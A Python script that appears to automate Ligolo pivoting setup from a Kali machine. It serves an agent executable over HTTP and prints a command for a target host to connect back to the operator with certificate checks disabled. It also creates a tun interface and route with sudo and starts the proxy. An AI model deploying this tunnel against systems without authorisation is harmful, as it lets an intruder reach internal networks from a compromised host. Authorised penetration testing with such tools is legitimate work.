#!/usr/bin/env python3

import subprocess
import signal
import sys
import os
import argparse
import http.server
import socketserver
import threading
import re

# Function to print colored text
def print_colored(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "reset": "\033[0m"
    }
    return f"{colors[color]}{text}{colors['reset']}"

# Function to handle Ctrl+C
def signal_handler(sig, frame):
    print("\nShutting down...")
    sys.exit(0)

# Function to serve the agent.exe using a simple HTTP server
def serve_agent_exe(directory, port):
    try:
        os.chdir(directory)
        handler = http.server.SimpleHTTPRequestHandler
        httpd = socketserver.TCPServer(("", port), handler)

        print(f"Serving agent.exe from {directory} on port {port}...")

        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down agent.exe server...")

# Check if Ligolo interface already exists
def ligolo_interface_exists():
    try:
        subprocess.run("sudo ip link show ligolo", shell=True, check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False

# Get the IP address of the tun0 interface
def get_tun0_ip():
    try:
        result = subprocess.run("ip -o -4 addr show tun0", shell=True, check=True, stdout=subprocess.PIPE, text=True)
        ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', result.stdout)
        if ip_match:
            return ip_match.group()
    except subprocess.CalledProcessError:
        pass
    return None

# Register the signal handler for Ctrl+C
signal.signal(signal.SIGINT, signal_handler)

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Setup Ligolo and serve agent.exe")
parser.add_argument("-i", "--ip", help="IP address of your Kali machine")
parser.add_argument("-a", "--agent", help="Path to the agent.exe executable")
parser.add_argument("--proxy", help="Path to the Ligolo proxy binary")
parser.add_argument("-H", "--help-command", action="help", help="Show this help message and exit")
parser.add_argument("--port", type=int, help="Port for serving agent.exe")
args = parser.parse_args()

# Attempt to get tun0 IP automatically
if not args.ip:
    tun0_ip = get_tun0_ip()
    if tun0_ip:
        args.ip = tun0_ip
    else:
        args.ip = input("Enter your Kali machine's IP address: ")

# Start a thread to serve agent.exe
if args.agent:
    agent_exe_path = args.agent
else:
    # Use a placeholder for find_agent_exe() since it's not needed
    agent_exe_path = "agent.exe_placeholder"

# Use the specified port or default to 8000
port = args.port if args.port else 8000

server_thread = threading.Thread(target=serve_agent_exe, args=(os.path.dirname(agent_exe_path), port))
server_thread.daemon = True
server_thread.start()

# Ligolo instructions
print("# Download Ligolo agent from the following link and execute the following command:")
print(print_colored(f"\n {agent_exe_path} -ignore-cert -connect {args.ip}:{port}", "green"))
print("\n\n# Execute the following in Ligolo")
print(print_colored("\nsession", "green"))
print(print_colored("\nifconfig", "green"))
print("\n\n# Run the following in a separate terminal window:")
print(print_colored(f"\nsudo ip route add <internalIP>.0/24 dev ligolo\n\n", "green"))

# Commands to create a tunnel interface for Ligolo
create_tun_cmd = f"sudo ip tuntap add mode tun user $USER name ligolo"
set_up_cmd = "sudo ip link set ligolo up"

# Check if Ligolo interface already exists
if ligolo_interface_exists():
    print(print_colored("Warning: Ligolo interface 'ligolo' already exists. Skipping creation.", "red"))
else:
    try:
        subprocess.run(create_tun_cmd, shell=True, check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        subprocess.run(set_up_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        # Check if the exit status is non-zero
        if e.returncode != 0:
            error_message = "Tunnel interface 'ligolo' could not be created or set up. Proceeding with caution."
            print(print_colored("Warning: " + error_message, "red"))
        else:
            # Raise the error if it's a different one
            raise e

# Command: Find the Ligolo proxy binary and execute it
if args.proxy:
    ligolo_proxy_path = args.proxy
else:
    # Use a placeholder for find_ligolo_proxy() since it's not needed
    ligolo_proxy_path = "ligolo_proxy_placeholder"

ligolo_cmd = f"{ligolo_proxy_path} -selfcert"
try:
    subprocess.run(ligolo_cmd, shell=True, check=True)
except subprocess.CalledProcessError as e:
    print(print_colored(f"Error: {e}", "red"))
    print("Shutting down...")
    sys.exit(1)
